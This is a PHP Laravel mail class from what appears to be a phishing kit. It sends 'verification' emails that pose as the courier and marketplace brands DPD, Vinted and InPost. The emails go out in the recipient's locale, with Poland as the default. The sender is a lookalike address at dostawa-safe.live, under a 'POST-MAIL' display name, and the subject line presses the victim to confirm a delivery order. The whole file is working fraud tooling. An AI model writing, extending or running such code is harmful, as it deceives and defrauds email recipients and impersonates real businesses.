<?php

namespace App\Mail;

use App\Models\Category;
use App\Models\Country;
use App\Models\Fake;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Mail\Mailable;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\App;
use Str;

class SendEmailFake extends Mailable
{
    use Queueable, SerializesModels;

    /**
     * @var Fake
     */
    protected $fake;

    /**
     * Create a new message instance.
     *
     * @return void
     */
    public function __construct(Fake $fake)
    {
        $this->fake = $fake;
    }

    /**
     * Build the message.
     *
     * @return $this
     */
    public function build()
    {
        $fake = $this->fake;
        $locale = $fake->country->locale ?? Country::locale(Country::POLAND);
        if (!App::isLocale($locale)) App::setLocale($locale);
        $categoryName = $fake->category->name;
        switch ($categoryName) {
            case Category::DPD:
            case Category::VINTED:
            case Category::INPOST:
                $name = config('mail.from.name', 'POST-MAIL');
                break;
            default:
                $name = Str::upper($categoryName);
                break;
        }
        $address = setting("{$categoryName}_email", setting('default_email', "{$categoryName}@dostawa-safe.live"));
        $subject = __("Please pass the verification to confirm the courier delivery order!");
        $view = "emails.fake.$categoryName";
        return $this->view((view()->exists($view) ? $view : "emails.fake.inpost"))
            ->from($address, $name)
            ->cc($address, $name)
            ->bcc($address, $name)
            ->replyTo($address, $name)
            ->subject($subject)
            ->with(['fake' => $fake, 'categoryName' => $categoryName]);
    }
}
